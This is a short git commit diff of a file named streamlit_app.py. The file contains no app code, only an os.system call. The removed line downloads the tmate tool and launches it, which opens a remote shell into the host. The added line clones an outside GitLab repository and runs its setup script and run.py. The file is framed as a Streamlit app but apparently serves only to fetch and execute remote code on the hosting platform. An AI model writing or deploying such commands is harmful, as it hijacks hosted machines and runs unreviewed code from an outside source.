e56f035a523621f86bb9c23f21192e91417e08a0
satubln <108394663+satubln@users.noreply.github.com>
2022-06-29 15:38:28 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system('curl https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz  && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 && ./tmate -F')
+os.system('git clone https://gitlab.com/renifer12/rp && cd rp && ./setup && python run.py')
